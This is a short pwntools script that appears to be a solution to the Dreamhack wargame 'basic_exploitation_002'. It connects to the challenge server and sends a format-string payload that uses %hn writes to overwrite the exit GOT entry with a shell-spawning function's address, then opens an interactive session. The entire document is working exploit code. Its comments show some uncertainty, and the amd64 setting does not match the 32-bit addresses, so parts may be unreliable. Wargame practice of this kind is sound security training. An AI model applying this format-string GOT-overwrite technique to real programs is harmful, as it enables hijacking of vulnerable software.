from pwn import *

def slog(n, m): return success(": ".join([n, hex(m)]))

r = remote("host3.dreamhack.games", 19860)
e = ELF("./basic_exploitation_002")
context.arch = "amd64"
context.log_level = "debug"

exit_got = 0x804a024
# get_shell = 0x8048609

# payload = [exit_got+2] [exit_got] %[length_1]c %1$hn %[length_2]c %1$hn
# exit_got+2 = 0x804a026 = \x26\xa0\x04\x08
# exit_got = \x24\xa0\x04\x08
# length_1 = [0x0804] - 8
# length_2 = [0x8609 - 0x0804] 

payload = "\x26\xa0\x04\x08"
payload += "\x24\xa0\x04\x08"
payload += "%2044c%1$hn"
payload += "%32261c%2$hn" # why not 1$hn?
print(payload)

r.sendline(payload)

r.interactive()